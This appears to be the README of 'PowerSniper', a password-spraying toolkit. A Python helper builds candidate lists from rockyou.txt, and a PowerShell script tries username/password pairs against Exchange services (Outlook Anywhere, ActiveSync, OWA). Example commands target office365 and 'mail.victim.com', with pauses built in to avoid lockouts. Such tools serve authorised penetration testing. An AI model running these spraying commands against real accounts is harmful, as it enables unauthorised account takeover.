# PowerSniper
Password spraying script and helper for creating password lists.

The Python script uses configurable parameters to extract complex passwords from a password list such as rockyou.txt.  It then analyzes the Damerau-Levenshtein distance between that password and a list of common passwords (the text file in this repository is the top 20 most common rockyou passwords that could be easily modified to be a complex password, i.e. not the one's that are all digits).  The script is configurable for the maximum distance to keep a password, with a default of 4, and will output results to a CSV file.

The PowerShell script loops through usernames and passwords and attempts to authenticate with them against various Microsoft Exchange web-based services.  The script supports pausing after a specified lockout count for a specified period of time to prevent account lockouts.

Requirements
============
passdist.py requires jellyfish

Usage
=====
<pre>
usage: rockdist.py [-h] --wordlist WORDLIST --toplist TOPLIST [--output OUTPUT] [--passmin PASSMIN] 
                        [--passmax PASSMAX] [--complex] [--passdist PASSDIST]
                        
  Get the distances between complex passwords and top passwords used

  optional arguments:  
    -h, --help           show this help message and exit  
    --wordlist WORDLIST  the file with the complex rockyou passwords (default: None)  
    --toplist TOPLIST    the file with the top rockyou passwords (default: None)  
    --output OUTPUT      the CSV output of the analysis (default: analysis.csv)  
    --passmin PASSMIN    the minimum size password to choose from (default: 7)  
    --passmax PASSMAX    the maximum size password to choose from (default: 12)  
    --complex            require complex passwords (default: 0)  
    --passdist PASSDIST  the maximum distance between passwords to keep (default: 4)
</pre>

Example passdist.py command:
<pre>
    python passdist.py --wordlist rockyou.txt --toplist toplist_rockyou.txt --output lowdist.csv --passmin 7 --passmax 12 --complex --passdist 4
</pre>

Example PowerSniper.ps1 usage:
<pre>
    # Outlook Anywhere Test
    Invoke-PowerSniper -uri https://outlook.office365.com -svc oa -userlist users.txt -passlist passwords.txt -sos false -lockout 6 -locktime 30
    
    # ActiveSync Test
    Invoke-PowerSniper -uri https://outlook.office365.com -svc as -userlist users.txt -passlist passwords.txt -sos false -lockout 6 -locktime 30
    
    # Outlook Web Access Test
    Invoke-PowerSniper -uri https://mail.victim.com/owa/auth.owa -svc owa -userlist users.txt -passlist passwords.txt -sos false -lockout 6 -locktime 30
</pre>
